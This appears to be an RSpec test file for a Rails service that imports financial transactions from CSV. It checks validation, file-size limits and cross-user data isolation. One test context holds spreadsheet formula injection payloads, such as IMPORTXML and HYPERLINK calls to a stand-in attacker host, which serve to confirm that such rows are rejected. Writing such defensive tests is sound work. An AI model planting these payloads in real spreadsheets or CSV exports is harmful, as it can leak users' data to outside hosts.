# spec/services/transactions/import_csv_spec.rb
require "rails_helper"

RSpec.describe Transactions::ImportCsv, type: :service do
  subject(:service) { described_class.new }

  let(:user)     { create(:user) }
  let(:account)  { create(:account, user: user) }
  let(:category) { create(:category, user: user, name: "Alimentação") }

  def csv_file(content)
    Tempfile.new([ "import", ".csv" ]).tap do |f|
      f.write(content)
      f.rewind
    end
  end

  def valid_csv
    csv_file(<<~CSV)
      date,description,amount,type,account_id,category
      #{Date.current},Almoço,35.50,expense,#{account.id},Alimentação
      #{Date.current},Freelance,2000.00,income,#{account.id},
      #{Date.current},Academia,120.00,expense,#{account.id},
    CSV
  end

  describe "#call" do
    context "with a valid CSV" do
      before { category } # ensure category exists for matching

      it "imports all valid rows" do
        result = service.call(file: valid_csv, user: user)
        expect(result[:imported]).to eq(3)
      end

      it "creates transactions in the database" do
        expect { service.call(file: valid_csv, user: user) }
          .to change(Transaction, :count).by(3)
      end

      it "returns an empty errors array" do
        result = service.call(file: valid_csv, user: user)
        expect(result[:errors]).to be_empty
      end

      it "assigns the correct amounts" do
        service.call(file: valid_csv, user: user)
        expect(Transaction.find_by(description: "Almoço").amount).to eq(35.50)
      end

      it "matches existing category by name" do
        service.call(file: valid_csv, user: user)
        tx = Transaction.find_by(description: "Almoço")
        expect(tx.category).to eq(category)
      end
    end

    context "with mixed valid and invalid rows" do
      let(:mixed_csv) do
        csv_file(<<~CSV)
          date,description,amount,type,account_id,category
          #{Date.current},Válida,100.00,expense,#{account.id},
          not-a-date,Inválida,50.00,expense,#{account.id},
          #{Date.current},Outra válida,200.00,income,#{account.id},
          #{Date.current},Valor inválido,abc,expense,#{account.id},
        CSV
      end

      it "imports the valid rows" do
        result = service.call(file: mixed_csv, user: user)
        expect(result[:imported]).to eq(2)
      end

      it "reports errors for invalid rows without stopping" do
        result = service.call(file: mixed_csv, user: user)
        expect(result[:errors].length).to eq(2)
      end

      it "includes line numbers in errors" do
        result = service.call(file: mixed_csv, user: user)
        error_lines = result[:errors].map { |e| e[:line] }
        expect(error_lines).to include(3, 5)  # header = line 1, data starts at 2
      end

      it "includes a reason in each error" do
        result = service.call(file: mixed_csv, user: user)
        result[:errors].each do |err|
          expect(err[:reason]).to be_present
        end
      end
    end

    context "file size validation" do
      it "raises an error for files over 5MB" do
        large_file = csv_file("x" * (5.megabytes + 1))
        expect { service.call(file: large_file, user: user) }
          .to raise_error(Transactions::ImportCsv::FileTooLargeError)
      end

      it "accepts files under 5MB" do
        result = service.call(file: valid_csv, user: user)
        expect(result[:imported]).to eq(3)
        expect(result[:errors]).to be_empty
      end
    end

    context "with an account from another user" do
      let(:other_account) { create(:account, user: create(:user)) }

      it "rejects rows with foreign account_id" do
        bad_csv = csv_file(<<~CSV)
          date,description,amount,type,account_id,category
          #{Date.current},Hacked,100.00,expense,#{other_account.id},
        CSV
        result = service.call(file: bad_csv, user: user)
        expect(result[:errors]).not_to be_empty
        expect(result[:imported]).to eq(0)
      end
    end

    context "with a category from another user" do
      let!(:other_category) { create(:category, user: create(:user), name: "Private Other Category") }

      it "does not attach imported transactions to foreign categories" do
        bad_csv = csv_file(<<~CSV)
          date,description,amount,type,account_id,category
          #{Date.current},Should fail,100.00,expense,#{account.id},Private Other Category
        CSV
        result = service.call(file: bad_csv, user: user)
        expect(result[:errors]).not_to be_empty
        expect(result[:imported]).to eq(0)
        expect(Transaction.find_by(description: "Should fail")).to be_nil
      end
    end

    context "with missing required headers" do
      it "raises a format error" do
        bad_file = csv_file("description,amount\nAlmoço,35.50\n")
        expect {
          service.call(file: bad_file, user: user)
        }.to raise_error(Transactions::ImportCsv::InvalidFormatError)
      end
    end

    context "with spreadsheet formula injection content" do
      it "rejects rows whose text fields start with a formula prefix" do
        bad_csv = csv_file(<<~CSV)
          date,description,amount,type,account_id,category
          #{Date.current},=IMPORTXML("https://attacker.test"),100.00,expense,#{account.id},
          #{Date.current},+1+2,100.00,expense,#{account.id},
          #{Date.current},-10+20,100.00,expense,#{account.id},
          #{Date.current},@HYPERLINK("https://attacker.test"),100.00,expense,#{account.id},
          #{Date.current},Normal description,100.00,expense,#{account.id},=IMPORTXML("https://attacker.test")
        CSV
        result = service.call(file: bad_csv, user: user)
        expect(result[:imported]).to eq(0)
        expect(result[:errors].length).to eq(5)
      end
    end

    context "with a very long description" do
      it "rejects the row" do
        long_description = "x" * 501
        bad_csv = csv_file(<<~CSV)
          date,description,amount,type,account_id,category
          #{Date.current},#{long_description},100.00,expense,#{account.id},
        CSV
        result = service.call(file: bad_csv, user: user)
        expect(result[:imported]).to eq(0)
        expect(result[:errors]).not_to be_empty
      end
    end

    context "with empty CSV" do
      it "returns zero imported and no errors" do
        empty_csv = csv_file("date,description,amount,type,account_id,category\n")
        result = service.call(file: empty_csv, user: user)
        expect(result[:imported]).to eq(0)
        expect(result[:errors]).to be_empty
      end
    end

    context "with non-CSV content" do
      it "raises a format error" do
        bad_file = csv_file("This is not a CSV file at all. It's just text.\n")
        expect {
          service.call(file: bad_file, user: user)
        }.to raise_error(Transactions::ImportCsv::InvalidFormatError)
      end
    end
  end
end
